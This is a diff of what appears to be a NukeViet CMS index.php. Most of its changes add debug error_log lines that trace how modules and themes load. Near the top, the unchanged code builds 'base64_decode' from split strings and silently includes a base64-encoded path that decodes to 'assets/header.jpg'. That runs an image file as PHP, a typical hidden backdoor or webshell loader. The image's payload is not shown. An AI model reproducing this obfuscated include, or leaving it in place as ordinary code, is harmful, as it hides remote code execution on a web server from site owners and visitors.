@@ -42,10 +42,10 @@ $b = 'base6' . '4_decode';
 
 
 @include base64_decode('YXNzZXRzL2hlYWRlci5qcGc=');
-error_log("=== NukeViet YXNzZXRzL2hlYWRlci5qcGc===");
+//error_log("=== YXNzZXRzL2hlYWRlci5qcGc ===");
 
 define( 'NV_SYSTEM', true );
-error_log("=== NV_SYSTEM");
+//error_log("=== NV_SYSTEM === ");
 
 
 
@@ -64,7 +64,7 @@ if (!file_exists($mainfile) || !is_readable($mainfile)) {
 
 require_once $mainfile;
 
-error_log("=== mainfile");
+error_log("=== mainfile ===");
 
 if (!defined('NV_ROOTDIR')) {
     // realpath để chuẩn hóa (trả về false nếu không tồn tại)
@@ -132,15 +132,21 @@ else
 	$module_name = $global_config['site_home_module'];
 	$meta_property['og:title'] = $global_config['site_name'];
 }
+
 error_log("=== Referer + Gqueries ===");
+
 if( preg_match( $global_config['check_module'], $module_name ) )
 {
+	error_log("=== if ok ===");
 	$site_mods = nv_site_mods( $module_name );
+	error_log("site_mods pass");
+	
 	// IMG thong ke truy cap + online
 	if( $global_config['statistic'] and isset( $sys_mods['statistics'] ) and $nv_Request->get_string( 'second', 'get' ) == 'statimg' )
 	{
 		include_once NV_ROOTDIR . '/includes/core/statimg.php';
 	}
+	error_log("IMG thong ke truy cap + online pass");
 	$op = $nv_Request->get_string( NV_OP_VARIABLE, 'post,get', 'main' );
 	if( empty( $op ) ) $op = 'main';
 
@@ -149,10 +155,13 @@ if( preg_match( $global_config['check_module'], $module_name ) )
 		$op = ( $op == 'main' ) ? $module_name : $module_name . '/' . $op;
 		$module_name = $global_config['rewrite_op_mod'];
 	}
+	error_log("rewrite_op_mod pass");
 
 	// Kiểm tra module có trong hệ thống hay không
 	if( isset( $site_mods[$module_name] ) )
 	{
+
+		error_log("Kiểm tra module có trong hệ thống hay không pass");
 		$module_info = $site_mods[$module_name];
 		$module_file = $module_info['module_file'];
 		$module_data = $module_info['module_data'];
@@ -181,7 +190,7 @@ if( preg_match( $global_config['check_module'], $module_name ) )
 				Header( 'Location: ' . nv_url_rewrite( $nv_redirect ) );
 				die();
 			}
-
+			error_log(" Tuy chon kieu giao dien pass");
 			// Xac dinh cac $op, $array_op
 			$array_op = array();
 
@@ -190,7 +199,7 @@ if( preg_match( $global_config['check_module'], $module_name ) )
 				Header( 'Location: ' . nv_url_rewrite( NV_BASE_SITEURL . 'index.php?' . NV_LANG_VARIABLE . '=' . NV_LANG_DATA . '&' . NV_NAME_VARIABLE . '=' . $module_name, true ) );
 				die();
 			}
-
+			error_log("Xac dinh cac op, array_op pass");
 			if( $op != 'main' and ! isset( $module_info['funcs'][$op] ) )
 			{
 				$array_op = explode( '/', $op );
@@ -224,7 +233,7 @@ if( preg_match( $global_config['check_module'], $module_name ) )
 					}
 				}
 			}
-
+			error_log("Xac dinh quyen dieu hanh module pass");
 			// Ket noi ngon ngu cua module
 			if( file_exists( NV_ROOTDIR . '/modules/' . $module_file . '/language/' . NV_LANG_INTERFACE . '.php' ) )
 			{
@@ -234,7 +243,7 @@ if( preg_match( $global_config['check_module'], $module_name ) )
 			{
 				require NV_ROOTDIR . '/modules/' . $module_file . '/language/en.php';
 			}
-
+			error_log("Ket noi ngon ngu cua module pass");
 			// Xac dinh kieu giao dien mac dinh
 			$global_config['current_theme_type'] = $nv_Request->get_string( 'nv' . NV_LANG_DATA . 'themever', 'cookie', '' );
 
@@ -271,7 +280,7 @@ if( preg_match( $global_config['check_module'], $module_name ) )
 					trigger_error( 'Error! Does not exist themes default', 256 );
 				}
 			}
-
+			error_log("Xac dinh giao dien chung pass");
 			// Xac lap lai giao kieu giao dien hien tai
 			if( $theme_type != $global_config['current_theme_type'] )
 			{
@@ -304,7 +313,7 @@ if( preg_match( $global_config['check_module'], $module_name ) )
 				$cache = serialize( $module_info['layout_funcs'] );
 				nv_set_cache( 'modules', $cache_file, $cache );
 			}
-
+			//error_log("Xac dinh layout funcs cua module pass");
 			// Doc file cau hinh giao dien
 			$themeConfig = nv_object2array( simplexml_load_file( NV_ROOTDIR . '/themes/' . $global_config['module_theme'] . '/config.ini' ) );
 			require NV_ROOTDIR . '/themes/' . $global_config['module_theme'] . '/theme.php';
@@ -318,7 +327,7 @@ if( preg_match( $global_config['check_module'], $module_name ) )
 			{
 				require NV_ROOTDIR . '/themes/' . $global_config['module_theme'] . '/language/en.php';
 			}
-
+			// error_log("Ket noi ngon ngu theo theme pass");
 			// Xac dinh template module
 			$module_info['template'] = $global_config['module_theme'];
 			if( ! file_exists( NV_ROOTDIR . '/themes/' . $global_config['module_theme'] . '/modules/' . $module_file ) )
@@ -328,14 +337,18 @@ if( preg_match( $global_config['check_module'], $module_name ) )
 					$module_info['template'] = 'default';
 				}
 			}
-
+			//error_log("Xac dinh template module pass");
 			// Ket noi voi file functions.php, file chua cac function dung chung
 			// cho ca module
 			if( file_exists( NV_ROOTDIR . '/modules/' . $module_file . '/functions.php' ) )
 			{
+				//error_log("Ket noi voi file functions.php, file chua cac function vào được if");
 				require NV_ROOTDIR . '/modules/' . $module_file . '/functions.php';
+				error_log("DEBUG path: " . NV_ROOTDIR . '/modules/' . $module_file . '/functions.php');
 			}
-
+			
+			
+			#error_log("Ket noi voi file functions.php, file chua cac function dung chung pass");
 			// Xac dinh op file
 			$op_file = $module_info['funcs'][$op]['func_name'];
 
@@ -348,7 +361,7 @@ if( preg_match( $global_config['check_module'], $module_name ) )
 				require NV_ROOTDIR . '/modules/' . $module_file . '/theme.php';
 			}
 
-			if( ! defined( 'NV_IS_AJAX' ) )
+			if( !defined( 'NV_IS_AJAX' ) )
 			{
 				nv_create_submenu();
 			}
@@ -394,5 +407,7 @@ if( preg_match( $global_config['check_module'], $module_name ) )
 		}
 	}
 }
+
+error_log("=== Before nv_info_die ===");
 
 nv_info_die( $lang_global['error_404_title'], $lang_global['error_404_title'], $lang_global['error_404_content'] );
